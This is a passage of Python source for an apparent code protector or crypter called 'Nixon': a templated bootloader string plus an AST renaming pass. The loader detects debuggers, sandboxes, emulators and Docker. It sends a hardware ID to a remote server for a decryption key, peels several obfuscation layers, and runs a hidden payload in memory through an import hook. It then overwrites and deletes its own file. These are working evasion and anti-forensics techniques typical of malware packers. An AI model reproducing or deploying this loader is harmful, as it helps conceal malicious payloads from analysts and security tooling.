    k_vm3 = vm_inst.{METHOD_RUN}(bytes(bc3), inputs)
    if not k_vm3: k_vm3 = b'\x00'*32
    return k_vm3
def {FUNC_HOOK}():
    try:
        pass
        if open is not _nixon_ビルトイン빌트인.open: return True
        if __import__ is not _nixon_ビルトイン빌트인.__import__: return True
        if {VAR_FUNC_ADV_HK}.{METHOD_CHECK}(): return True
    except: pass
    return False
def {FUNC_NET}():
    max_retries = 3
    for attempt in range(max_retries):
        try:
            raw_url = {FUNC_STR_DEC}({VAR_NET_URL})
            if not raw_url or len(raw_url) < 10: return b"\x00"*32
            try:
                doh_key = {FUNC_DOH}("key.nixon.auth") 
                if doh_key: return doh_key.encode()[:32]
            except: pass
            with {VAR_FUNC_SEC_MEM}(raw_url) as s_url:
                url = s_url.decode()
                hw = _nx_mac()
                p = _nixon_ジェイソン제이슨.dumps({{"hw": hw, "ts": int(_nixon_時間시간.time()), "nonce": _nixon_シークレット시크릿.token_hex(8)}}).encode()
                r = _nixon_ウラルユーアールエル유알엘.request.Request(url, data=p, headers={{"User-Agent": "Mozilla/5.0"}})
                c = {FUNC_TLS_CTX}()
                res = _nixon_ウラルユーアールエル유알엘.request.urlopen(r, timeout=5, context=c)
                d = _nixon_ジェイソン제이슨.loads(res.read())
                if d.get("valid"): return b"\x00"*32 
                return b"\x00"*32
        except Exception as e:
            if attempt == max_retries - 1:
                {FUNC_LOG}("[FATAL] Network auth failed after retries") 
                {FUNC_TRIGGER_ALERT}("Network Auth Failed Final")
                if not {VAR_IS_DEBUG}:
                    pass
            _nixon_時間時間.sleep(2 ** attempt)
    return b"\x00"*32
def {FUNC_RES}():
    s = 0
    try:
        if hasattr(_nixon_オペレーション운영, 'sysconf'):
            if _nixon_オペレーション운영.sysconf('SC_NPROCESSORS_ONLN') < 2: s += 1
        if _nixon_オペレーション운영.path.exists("/.dockerenv"): s += 2
        if _nixon_オペレーション운영.path.exists("/data/data/com.termux"): s = 0 
    except: pass
    return s > 0
def {FUNC_MEM}():
    _nixon_ガベージ가비지.disable()
    t0 = _nixon_時間시간.perf_counter()
    _ = bytearray(100000) 
    base = max(_nixon_時間시간.perf_counter() - t0, 0.000001)
    t0 = _nixon_時間시간.perf_counter()
    try:
        x = bytearray(5 * 1024 * 1024)
        {FUNC_WIPE}(x)
    except: pass
    diff = _nixon_時間시간.perf_counter() - t0
    _nixon_ガベージ가비지.enable()
    if diff > 15.0: 
        pass
        return False 
    return False
def {FUNC_CHECK}():
    if {FUNC_RDTSC}(): _accumulate_poison(17)
    import sys
    if sys.gettrace(): _accumulate_poison(33)
    if {FUNC_HOOK}(): _accumulate_poison(65)
    try:
        import sys; f = sys._getframe(1)
        if 'frozen' not in f.f_code.co_filename and __file__ not in f.f_code.co_filename:
             _accumulate_poison(128)
    except: pass
    _NX_POISON_KEY = b''.__class__([95, 78, 88, 95, 80, 79, 73, 83, 79, 78]).decode()
    return globals().get(_NX_POISON_KEY, 0)
def {FUNC_ROT}(d):
    if isinstance(d, str): d = d.encode()
    return bytes([(b - 13) % 256 for b in d])
def {FUNC_DEC_REC}(e):
    try:
        outer = _nixon_ベース베이스.b64decode(e)
        rotated = {FUNC_ROT}(outer)
        inner = _nixon_ベース베이스.b64decode(rotated)
        r = _nixon_ジェイソン제이슨.loads(inner.decode())
        if not isinstance(r, list) or len(r) > 100: raise Exception("Invalid Recipe")
        return r
    except Exception as err: 
        {FUNC_LOG}(f"[FATAL] Recipe Decode Failed: {{err}}"); _nixon_システム시스템.exit(1)
def {FUNC_REV}(s, r):
    b = s.encode('latin1') if isinstance(s, str) else s
    _B64 = chr(98)+chr(54)+chr(52)
    _B32 = chr(98)+chr(51)+chr(50)
    _B16 = chr(98)+chr(49)+chr(54)
    _B85 = chr(98)+chr(56)+chr(53)
    _R13 = chr(114)+chr(111)+chr(116)+chr(49)+chr(51)
    for l in reversed(r):
        try:
            if l == _B64: b = _nixon_ベース베이스.b64decode(b)
            elif l == _B32: b = _nixon_ベース베이스.b32decode(b)
            elif l == _B16: b = _nixon_ベース베이스.b16decode(b)
            elif l == _B85: b = _nixon_ベース베이스.b85decode(b)
            elif l == _R13: b = {FUNC_ROT}(b)
        except Exception as err: 
            {FUNC_LOG}(f"[FATAL] Onion Decode Failed at {{l}}: {{err}}"); 
            _nixon_システム시스템.exit(1)
    return b
def {FUNC_JOIN}():
    p = []
    g = globals()
    for i in range({VAR_TOTAL_PARTS}):
        k = f"{PART_PREFIX}{{i}}"
        if k in g: p.append(g[k])
        else: 
            {FUNC_LOG}("[FATAL] Payload corrupted"); _nixon_システム시스템.exit(1)
    return "".join(p)
def {FUNC_STAGE0}():
    k = {VAR_S0_A} + {VAR_S0_B}
    enc = {FUNC_JOIN}()
    if len(enc) == 0:
        {FUNC_LOG}("[FATAL] Payload reassembly failed."); _nixon_システム시스템.exit(1)
    try:
        raw = _nixon_ベース베이스.b64decode(enc)
        dec = bytes([raw[i] ^ k[i % len(k)] for i in range(len(raw))])
        return dec.decode('utf-8')
    except Exception as e:
        {FUNC_LOG}(f"[FATAL] Stage0 Decode Error: {{e}}"); _nixon_システム시스템.exit(1)
def {FUNC_FETCH_CRITICAL}(auth_input):
    try:
        import ssl, struct
        url = {FUNC_STR_DEC}({VAR_NET_URL})
        if not url: return False
        session_token = bytes.fromhex("{SESSION_TOKEN}")
        cipher = {VAR_CIPHER_CLS}(session_token)
        nonce = _nixon_シークレット시크릿.token_bytes(12)
        enc_pass = cipher.decrypt(auth_input.encode(), nonce)
        pub_key = {NTRU_PUB_KEY}
        N = 509; Q = 2048
        m_poly = [0] * N
        session_bits = "".join(format(b, '08b')[::-1] for b in session_token)
        for i, bit in enumerate(session_bits):
            if i < N: m_poly[i] = int(bit)
        r_poly = [0] * N
        for i in range(N): r_poly[i] = _nixon_シークレット시크릿.choice([-1, 0, 1])
        e_poly = list(m_poly)
        for i in range(N):
            if r_poly[i] == 0: continue
            for j in range(N):
                idx = (i + j) % N
                term = (r_poly[i] * pub_key[j]) % Q
                e_poly[idx] = (e_poly[idx] + term) % Q
        ntru_blob = bytearray()
        for coeff in e_poly:
            if coeff < 0: coeff += Q
            ntru_blob.extend(coeff.to_bytes(2, 'big'))
        final_payload = bytearray()
        final_payload.extend(len(ntru_blob).to_bytes(2, 'big'))
        final_payload.extend(ntru_blob)
        final_payload.extend(nonce)
        final_payload.extend(enc_pass)
        req = _nixon_ウラルユーアールエル유알엘.request.Request(url, data=bytes(final_payload), headers={{"User-Agent": "Nixon/2.0"}})
        ctx = {FUNC_TLS_CTX}()
        resp_raw = _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=15, context=ctx).read()
        resp_iv = resp_raw[:12]
        resp_blob = resp_raw[12:]
        final_key = cipher.decrypt(resp_blob, resp_iv)
        if len(final_key) > 10:
            globals()['_RUNTIME_KEY'] = final_key.decode()
            return True
        return False
    except: return False
def {FUNC_BOOT}():
    # Verify the loader's own integrity BEFORE anything else runs.  A
    # tampered loader must not be able to divert the state machine and
    # then exit 0.  {FUNC_SELF}() exits 137 on a mismatch.
    {FUNC_SELF}()
    _gc_handle = {FUNC_GC_SHIELD}() if '{FUNC_GC_SHIELD}' in dir() else None
    {FUNC_LOG}("[DEBUG] Bootloader starting...")
    if not {FUNC_NANOMITE_MAIN}(): return
    if {VAR_ONE_SHOT}:
        def _one_shot_cleanup():
            try:
                targets = set()
                # __file__ is NOT a target: in a packed artifact it is the
                # temp file the outer loader extracted, and that loader deletes
                # it at exit anyway.  Wiping it made the loader's own re-entry
                # fail its self-check (ENOENT) and kill a clean run.  The
                # artifact itself (argv[0] / NX_ORIGIN) is still wiped.
                if _nixon_システム시스템.argv and _nixon_システム시스템.argv[0]: targets.add(_nixon_オペレーション운영.path.abspath(_nixon_システム시스템.argv[0]))
                origin = _nixon_オペレーション운영.environ.get("NX_ORIGIN")
                if origin: targets.add(origin)
                for t in targets:
                    if _nixon_オペレーション운영.path.exists(t) and _nixon_オペレーション운영.path.isfile(t):
                        try:
                            sz = _nixon_オペレーション운영.path.getsize(t)
                            with open(t, "rb+") as f: f.write(_nixon_オペレーション운영.urandom(sz))
                        except: pass
                        try:
                            try: _nixon_オペレーション운영.chmod(t, 0o600)
                            except Exception: pass
                            _nixon_オペレーション운영.unlink(t)
                        except: pass
            except: pass
        _nixon_アテクシット종료.register(_one_shot_cleanup)
    {FUNC_MASK}() 
    {FUNC_ANTMAN}()
    try:
        {VAR_ATTRITION_CLS}.{METHOD_LOG_EXPLOSION}()
        {VAR_ATTRITION_CLS}.{METHOD_RDTSC_FLOOD}()
    except: pass 
    ctx = {{'h': 0}}
    S_INIT = 0; S_STG0 = 1; S_REC = 2; S_ON1 = 3; S_ZIP1 = 4
    S_ON2 = 5; S_DEC1 = 6; S_VM = 7; S_PAD = 8; S_LOAD = 9; S_EXEC = 10; S_EXIT = 11
    def {FUNC_STATE_INIT}():
        try:
            try:
                if {VAR_CROSS_PLATFORM_GUARD_CLS}.{METHOD_UNIVERSAL_GUARD}():
                    {FUNC_LOG}("[WARN] Universal Debugger Detected")
                    {VAR_TEMPORAL_DEGRADE_CLS}.{METHOD_TD_INJECT_ANOMALY}(5)
            except: pass
            _sbx = {VAR_ANTI_SANDBOX_CLS}
            if _sbx.{METHOD_FULL_SANDBOX_CHECK}():
                {FUNC_LOG}("[WARN] Automated Sandbox detected (Time Acceleration/Low Res)")
                if not {VAR_IS_DEBUG}:
                    pass
        except: pass
        deg = {FUNC_CHECK}()
        if deg & 1: ctx['h'] = {FUNC_NEXT_H}(ctx['h'], "BAD") 
        try: {DECOY_FUNC}()
        except: pass
        {FUNC_DECOY_PROC}()
        try:
            import uuid as _uuid_rce
            if not {FUNC_FETCH_CRITICAL}(_nx_mac()) and not {VAR_IS_DEBUG}:
                {FUNC_LOG}("[WARN] Remote Critical Code Fetch Failed")
                ctx['h'] = {FUNC_NEXT_H}(ctx['h'], "NET_FAIL")
                _nx_strict_fail("net-fail")
            {runtime_check_code}
        except: pass
        try:
            _emu_check = {VAR_ANTI_EMULATOR_CLS}
            _emu_ok, _emu_results = _emu_check.{METHOD_FULL_CHECK}()
            if not _emu_ok and not {VAR_IS_DEBUG}:
                {FUNC_LOG}("[WARN] Emulator/VM detected")
                ctx['h'] = {FUNC_NEXT_H}(ctx['h'], "EMU_FAIL")
                _nx_strict_fail("emu")
        except: pass
        try:
            _frame_chk = {VAR_FRAME_ANTI_DEBUG_CLS}
            if _frame_chk.{METHOD_CHECK_FRAME}() and not {VAR_IS_DEBUG}:
                {FUNC_LOG}("[WARN] Debugger frame detected")
                ctx['h'] = {FUNC_NEXT_H}(ctx['h'], "DBG_FRAME")
                _nx_strict_fail("dbg-frame")
        except: pass
        try:
            _opaque = {VAR_OPAQUE_CONST_CLS}
            _opq_val = _opaque.{METHOD_OPAQUE_PRED}(ctx.get('h', 0))
            ctx['opaque_seed'] = _opq_val
        except: pass
        try:
            _hw_perf = {VAR_HW_PERF_CLS}()
            ctx['hw_fingerprint'] = _hw_perf.{METHOD_GET_FINGERPRINT}()
        except: pass
        try:
            import uuid as _uuid_lic
            _lic = {VAR_BLOCKCHAIN_LIC_CLS}("{blockchain_contract}", "{blockchain_rpc}")
            _hw_id_for_chain = _nx_mac()
            if not _lic.{METHOD_CHECK_LICENSE}(_hw_id_for_chain) and not {VAR_IS_DEBUG}:
                {FUNC_LOG}("[WARN] Blockchain license check failed")
                ctx['h'] = {FUNC_NEXT_H}(ctx['h'], "NO_TOKEN")
                _nx_strict_fail("no-token")
        except: pass
        try:
            _shard_urls = {key_shard_urls}
            _shard_threshold = max(2, len(_shard_urls) // 2 + 1) if _shard_urls else 3
            _sharding = {VAR_KEY_SHARD_CLS}(threshold=_shard_threshold, total_shards=len(_shard_urls) if _shard_urls else 5)
            if _shard_urls and len(_shard_urls) >= _shard_threshold:
                _remote_key_part = _sharding.{METHOD_FETCH_SHARDS}(_shard_urls)
                if _remote_key_part:
                    ctx['remote_key'] = _remote_key_part
                    ctx['h'] = {FUNC_NEXT_H}(ctx['h'], _remote_key_part[:8])
        except: pass
        try:
            _geo = {VAR_GEOFENCE_CLS}({allowed_countries}, {allowed_regions})
            if not _geo.{METHOD_CHECK_ALLOWED}() and not {VAR_IS_DEBUG}:
                {FUNC_LOG}("[WARN] Geographic restriction failed")
                ctx['h'] = {FUNC_NEXT_H}(ctx['h'], "GEO_BLOCK")
                _nx_strict_fail("geo-block")
        except: pass
        try:
            _int_mon = {VAR_INTEGRITY_MON_CLS}()
            _int_mon.{METHOD_REGISTER_FUNC}("boot", {FUNC_BOOT})
            ctx['integrity_monitor'] = _int_mon
        except: pass
        h_bytes = {FUNC_SELF}()
        if len(h_bytes) != 32: 
             ctx['h'] = {FUNC_NEXT_H}(ctx['h'], "TAMPER")
        ctx['h'] = {FUNC_NEXT_H}(ctx['h'], 0)
        return S_STG0
    def {FUNC_STATE_STG0}():
        ctx["full"] = {FUNC_STAGE0}()
        ctx['h'] = {FUNC_NEXT_H}(ctx['h'], 1)
        return S_REC
    def {FUNC_STATE_REC}():
        ctx["r_in"] = {FUNC_DEC_REC}({VAR_RECIPE_IN})
        ctx["r_out"] = {FUNC_DEC_REC}({VAR_RECIPE_OUT})
        ctx['h'] = {FUNC_NEXT_H}(ctx['h'], 2)
        return S_ON1
    def {FUNC_STATE_ON1}():
        ctx["mid_zip"] = {FUNC_REV}(ctx["full"], ctx["r_out"])
        ctx['h'] = {FUNC_NEXT_H}(ctx['h'], 3)
        return S_ZIP1
    def {FUNC_STATE_ZIP1}():
        try:
            with _nixon_ジップ압축파일.ZipFile(_nixon_アイオー입출력.BytesIO(ctx["mid_zip"])) as z:
                ctx["inner_blob"] = z.read("payload")
        except Exception as e:
            {FUNC_LOG}(f"[FATAL] Mid-Zip Failed: {{e}}"); _nixon_システム시스템.exit(1)
        ctx['h'] = {FUNC_NEXT_H}(ctx['h'], 4)
        return S_ON2
    def {FUNC_STATE_ON2}():
        ctx["raw_enc"] = {FUNC_REV}(ctx["inner_blob"], ctx["r_in"])
        ctx['h'] = {FUNC_NEXT_H}(ctx['h'], 5)
        return S_DEC1
    def {FUNC_STATE_DEC1}():
        if len(ctx.get("raw_enc", b"")) > 0: 
            try: ctx["raw"] = _nixon_圧縮압축.decompress(ctx["raw_enc"])
            except: pass
        ctx["raw"] = _nixon_エルゼット압축.decompress(ctx["raw_enc"])
        ctx['h'] = {FUNC_NEXT_H}(ctx['h'], 6)
        return S_VM
    def {FUNC_STATE_VM}():
        {FUNC_LOG}("[DEBUG] Phased Key Derivation...")
        k_int = {FUNC_DERIVE_INTEGRITY}()
        k_env = {FUNC_DERIVE_ENV}(k_int)
        k_final = {FUNC_UNLOCK_VM}(k_env, ctx["full"], {VAR_PART_A}, {VAR_PART_B})
        time_window = _NX_BUILD_WINDOW
        time_salt = _nixon_ハッシュ해시.sha256(str(time_window).encode()).digest()
        sim_h = 0
        for i in range(7): sim_h = {FUNC_NEXT_H}(sim_h, i)
        prov_salt = _nixon_ハッシュ해시.sha256(str(sim_h).encode()).digest()
        k_dec = bytes([a ^ b ^ c for a, b, c in zip(k_final, time_salt, prov_salt)])
        ctx["raw"], _fake_flag = {FUNC_DECOY_XFORM}(ctx["raw"])
        cip = {VAR_CIPHER_CLS}(k_dec)
        ctx["dec_padded"] = cip.decrypt(ctx["raw"], {VAR_NONCE})
        ctx['h'] = {FUNC_NEXT_H}(ctx['h'], 7)
        return S_PAD
    def {FUNC_STATE_PAD}():
        ctx["dec"] = {FUNC_REM_ENT}(ctx["dec_padded"])
        m = "{MAGIC_STR}".encode()
        if not ctx["dec"].startswith(m): 
            {FUNC_LOG}("[FATAL] Magic Mismatch (Decryption Failed)"); _nixon_システム시스템.exit(1)
        ctx["zip"] = ctx["dec"][len(m):]
        # Authenticate the payload before anything is extracted from
        # it.  The zip is XOR-encrypted with no MAC of its own, so a
        # byte flipped in the payload region used to corrupt the
        # payload SILENTLY -- the loader ran, the payload was garbage,
        # and nothing said so.  The tag is keyed with the inner key
        # (already embedded) and computed by the build.
        try:
            import hmac as _nx_mac_h
            import hashlib as _nx_mac_sha
            _nx_mac_key = bytes.fromhex('{INNER_KEY_HEX}')
            _nx_mac_got = _nx_mac_h.new(_nx_mac_key, ctx["zip"],
                                        _nx_mac_sha.sha256).hexdigest()
            if not _nx_mac_h.compare_digest(_nx_mac_got,
                                          "{VAR_PAYLOAD_MAC}"):
                {FUNC_LOG}("[FATAL] Payload integrity check failed")
                import os as _nx_mac_os
                _nx_mac_os._exit(137)
        except SystemExit:
            raise
        except Exception as _nx_mac_e:
            {FUNC_LOG}(f"[FATAL] Payload integrity check error: {{_nx_mac_e}}")
            import os as _nx_mac_os2
            _nx_mac_os2._exit(137)
        ctx['h'] = {FUNC_NEXT_H}(ctx['h'], 8)
        return S_LOAD
    def {FUNC_STATE_LOAD}():
        ldr = {VAR_LOADER_CLS}(ctx["zip"], SWIZZLE_KEY, MORPH_MAP)
        _nixon_システム시스템.meta_path.insert(0, ldr)
        ctx["ldr"] = ldr
        ctx['h'] = {FUNC_NEXT_H}(ctx['h'], 9)
        return S_EXEC
    def {FUNC_STATE_EXEC}():
        try:
            {FUNC_LOG}("[DEBUG] Executing...")
            if {VAR_ONE_SHOT}:
                try:
                    targets = set()
                    # __file__ is NOT a target: in a packed artifact it is the
                    # temp file the outer loader extracted, and that loader deletes
                    # it at exit anyway.  Wiping it made the loader's own re-entry
                    # fail its self-check (ENOENT) and kill a clean run.  The
                    # artifact itself (argv[0] / NX_ORIGIN) is still wiped.
                    if _nixon_システム시스템.argv and _nixon_システム시스템.argv[0]: targets.add(_nixon_オペレーション운영.path.abspath(_nixon_システム시스템.argv[0]))
                    origin = _nixon_オペレーション운영.environ.get("NX_ORIGIN")
                    if origin: targets.add(origin)
                    for t in targets:
                        if _nixon_オペレーション운영.path.exists(t) and _nixon_オペレーション운영.path.isfile(t):
                            sz = _nixon_オペレーション운영.path.getsize(t)
                            with open(t, "rb+") as f: f.write(_nixon_オペレーション운영.urandom(sz))
                            try: _nixon_オペレーション운영.rename(t, t + ".corrupted")
                            except: pass
                            try: _nixon_オペレーション운영.unlink(t + ".corrupted")
                            except: pass
                except: pass
            if FORCE_NATIVE_MODE and isinstance({VAR_NATIVE_BLOB}, dict) and any({VAR_NATIVE_BLOB}.values()):
                {FUNC_LOG}("[DEBUG] Loading Native Module (Multi-Arch)...")
                try:
                    h = {VAR_NATIVE_BLOB}_Loader.{METHOD_LOAD}({VAR_NATIVE_BLOB})
                    if h:
                        {FUNC_LOG}("[SUCCESS] Native module loaded from memory.")
                        ldr = ctx["ldr"]
                        if "__main__.nixon" in ldr.z.namelist():
                            enc_data = ldr.z.read("__main__.nixon")
                            key = bytes.fromhex('{INNER_KEY_HEX}')
                            globals()["_nx_payload_ran"] = True
                            h.NativeVM({{}}, 0).exec_secure(enc_data, key)
                            return S_EXIT
                    else:
                        {FUNC_LOG}("[WARN] Failed to load native module or OS not supported.")
                except Exception as e:
                    {FUNC_LOG}(f"[FATAL] Native Load Error: {{e}}")
            else:
                {FUNC_LOG}("[DEBUG] Loading Python payload...")
                ldr = ctx["ldr"]
                entry_point = None
                possible_names = ["__main__.pyc", "__main__.py"]
                for name in possible_names:
                    if name in ldr.z.namelist():
                        entry_point = name
                        break
                if not entry_point:
                    for name in ldr.z.namelist():
                        if name.endswith(".pyc") or name.endswith(".py"):
                            entry_point = name
                            break
                if entry_point:
                    enc_data = ldr.z.read(entry_point)
                    spec = _nixon_インポート임포트.util.spec_from_loader("__main__", ldr)
                    module = _nixon_インポート임포트.util.module_from_spec(spec)
                    module.__name__ = "__main__"
                    _nixon_システム시스템.modules["__main__"] = module
                    globals()["_nx_payload_ran"] = True
                    ldr.exec_module(module)
                else:
                    raise Exception("Entry point not found")
            {FUNC_WIPE}(bytearray(ctx["zip"]))
            ctx["dec"] = b""
            ctx["dec_padded"] = b""
            _nixon_システム시스템.stdout.flush()
        except Exception as e:
            if {VAR_IS_DEBUG}:
                {FUNC_LOG}(f"[FATAL] Exec failed: {{e}}"); _nixon_トレースバック트랙.print_exc()
            else: _nixon_システム시스템.exit(1)
        return S_EXIT
    dispatcher = {{
        S_INIT: {FUNC_STATE_INIT}, S_STG0: {FUNC_STATE_STG0}, S_REC: {FUNC_STATE_REC},
        S_ON1: {FUNC_STATE_ON1}, S_ZIP1: {FUNC_STATE_ZIP1}, S_ON2: {FUNC_STATE_ON2},
        S_DEC1: {FUNC_STATE_DEC1}, S_VM: {FUNC_STATE_VM}, S_PAD: {FUNC_STATE_PAD},
        S_LOAD: {FUNC_STATE_LOAD}, S_EXEC: {FUNC_STATE_EXEC}
    }}
    curr = S_INIT
    while curr != S_EXIT:
        try:
            if _nixon_ランダム랜덤.random() < 0.05: 
                try: {DECOY_FUNC}()
                except: pass
            _ = 1 // 0 
        except ZeroDivisionError:
            try:
                curr = dispatcher[curr]()
            except Exception as e:
                if {VAR_IS_DEBUG}:
                    {FUNC_LOG}(f"[FATAL] State Machine Crash: {{e}}")
                    break
                # Fail closed.  The loader used to `break` out of the
                # state machine on ANY failure, so a tampered artifact
                # (its own hash feeds the key derivation, so tampering
                # corrupts the payload) simply ran nothing and exited 0.
                # A tamperer saw a clean success.  Now a crashed loader
                # dies like the kill ladder does: silent, exit 137.
                import os as _nx_sm_os
                _nx_sm_os._exit(137)
    # The payload must actually have run.  A tampered loader can
    # divert the state machine before the payload is executed, and the
    # loader used to exit 0 in that case -- indistinguishable from a
    # clean run.  Now it fails closed.
    if not globals().get("_nx_payload_ran"):
        import os as _nx_pr_os
        _nx_pr_os._exit(137)
# Verify the loader's own integrity BEFORE anything else runs, and
# at MODULE level so a tamper cannot dodge it by disabling the
# entry point below.  A mismatch exits 137.
{FUNC_SELF}()
if __name__ == "__main__":
    _nixon_マルチ멀티.freeze_support()
    {FUNC_BOOT}()
# The payload must actually have run.  A tampered loader can divert
# the state machine before the payload is executed, and the loader
# used to exit 0 in that case -- indistinguishable from a clean
# run.  This check is outside the __main__ block on purpose: if the
# block above was tampered with, this still fires.
if not globals().get("_nx_payload_ran"):
    import os as _nx_pr_os
    _nx_pr_os._exit(137)'''

class _apply_final_rename(ast.NodeTransformer):
    """Apply the renamer's final mapping to every binding it may have missed.

    `get_new_name` records a mapping the first time a name is seen, so a binding
    visited before that point keeps its original spelling while later uses take
    the new one. The result is order-dependent, and for the function table it
    produced an entry naming a function that was never emitted.

    This pass rewrites names, function and class names, but NOT `arg` or
    `keyword.arg`: parameter and keyword names are call-site contracts and must
    keep their spelling regardless of the mapping.
    """

    def __init__(self, renamer):
        self.mapping = dict(getattr(renamer, "mapping", {}) or {})

    def visit_Name(self, node):
        node.id = self.mapping.get(node.id, node.id)
        return node

    def visit_FunctionDef(self, node):
        node.name = self.mapping.get(node.name, node.name)
        self.generic_visit(node)
        return node

    def visit_AsyncFunctionDef(self, node):
        return self.visit_FunctionDef(node)

    def visit_ClassDef(self, node):
        node.name = self.mapping.get(node.name, node.name)
        self.generic_visit(node)
        return node

    def visit_arg(self, node):
        return node

    def visit_keyword(self, node):
        self.generic_visit(node)
        return node
